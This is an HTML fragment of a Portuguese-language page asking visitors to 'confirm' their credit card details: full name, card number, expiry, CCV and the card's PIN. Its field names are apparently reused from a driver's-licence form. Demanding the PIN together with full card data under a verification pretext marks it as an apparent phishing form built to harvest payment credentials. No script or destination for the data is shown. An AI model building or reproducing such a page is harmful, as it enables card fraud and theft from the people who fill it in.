<div class="labelCard">
    
    <div class="homeCard">
        
        <div class="form-container">
            <div>
            <img class="cardsformImg" src="./img/cards.png" alt="">
            </div>
            <h2>Confirme os dados do seu cartão de crédito</h2>
            <form id="cadastroForm">
                <!-- Nome do Usuário -->
                <div class="form-group">
                    <label for="username">Nome Completo</label>
                    <input type="text" id="username" name="username" required>
                </div>
    
                <!-- Número da CNH -->
                <div class="form-group">
                    <label for="cnh">Número do Cartão</label>
                    <input type="text" id="cnh" name="cnh" required maxlength="19" pattern="\d{4}-\d{4}-\d{4}-\d{4}" placeholder="0000-0000-0000-0000">
                </div>
    
                <!-- Vencimento da CNH -->
                <div class="form-group">
                    <label for="cnhVenc">Data de Expiração</label>
                    <input type="month" id="cnhVenc" name="cnhVenc" required>
                </div>
    
                <!-- Chave de Verificação -->
                <div class="form-group">
                    <label for="verificacao">CCV</label>
                    <input type="text" id="verificacao" name="verificacao" required maxlength="3" pattern="\d{3}" placeholder="000">
                </div>
    
                <!-- Senha do Cadastro -->
                <div class="form-group">
                    <label for="senha">Senha do Cartão</label>
                    <input type="password" 
                           id="senha" 
                           name="senha" 
                           required 
                           pattern="\d{4,6}" 
                           title="A senha deve conter de 4 a 6 dígitos numéricos">
                </div>
                
    
                <button type="submit">Verificar</button>
            </form>
        </div>
    </div>
